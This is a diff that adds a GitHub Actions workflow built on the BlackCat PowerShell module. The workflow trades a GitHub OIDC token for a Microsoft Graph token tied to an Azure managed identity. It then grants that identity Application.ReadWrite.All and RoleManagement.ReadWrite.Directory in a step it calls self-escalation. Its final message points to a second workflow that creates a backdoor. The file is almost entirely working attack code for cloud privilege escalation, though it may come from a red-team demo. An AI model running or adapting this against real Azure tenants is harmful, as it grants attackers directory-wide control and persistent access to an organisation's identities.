@@ -1,0 +1,64 @@
+name: 1-Grant-Permissions
+on: workflow_dispatch
+
+permissions:
+  id-token: write
+  contents: read
+
+env:
+  AZURE_TENANT_ID: "67f8647a-6555-4c70-bee4-45625d332c3f"
+  UAMI_CLIENT_ID: "3fa85f64-5717-4562-b3fc-2c963f66afa6"
+  UAMI_OBJECT_ID: "197e935d-02a7-4ca3-98a2-a2b0ffc389f6"
+
+jobs:
+  grant-permissions:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout BlackCat
+        uses: actions/checkout@v4
+
+      - name: Get GitHub OIDC Token
+        id: oidc
+        run: |
+          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
+            -H "Accept: application/json" \
+            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
+          echo "::add-mask::$OIDC_TOKEN"
+          echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT
+
+      - name: Exchange for UAMI Token
+        id: token
+        run: |
+          GRAPH_TOKEN=$(curl -sX POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "client_id=$UAMI_CLIENT_ID" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=${{ steps.oidc.outputs.oidc_token }}" \
+            -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
+          
+          B64_TOKEN=$(echo -n "$GRAPH_TOKEN" | base64 -w 0)
+          echo "::add-mask::$B64_TOKEN"
+          echo "b64_token=$B64_TOKEN" >> $GITHUB_OUTPUT
+
+      - name: Grant Permissions to UAMI (Self-Escalation)
+        shell: pwsh
+        run: |
+          Import-Module ./BlackCat.psd1
+          
+          Connect-GraphToken -AccessToken "${{ steps.token.outputs.b64_token }}" -asBase64 -EndpointType MSGraph
+          
+          Write-Host "🔐 Granting Application.ReadWrite.All to UAMI..."
+          Set-ManagedIdentityPermission `
+            -servicePrincipalId $env:UAMI_OBJECT_ID `
+            -CommonResource MicrosoftGraph `
+            -appRoleName "Application.ReadWrite.All"
+          
+          Write-Host "🔐 Granting RoleManagement.ReadWrite.Directory to UAMI..."
+          Set-ManagedIdentityPermission `
+            -servicePrincipalId $env:UAMI_OBJECT_ID `
+            -CommonResource MicrosoftGraph `
+            -appRoleName "RoleManagement.ReadWrite.Directory"
+          
+          Write-Host "✅ UAMI self-escalation complete!"
+          Write-Host "⚠️  Now run Workflow #2 to get fresh token and create backdoor"
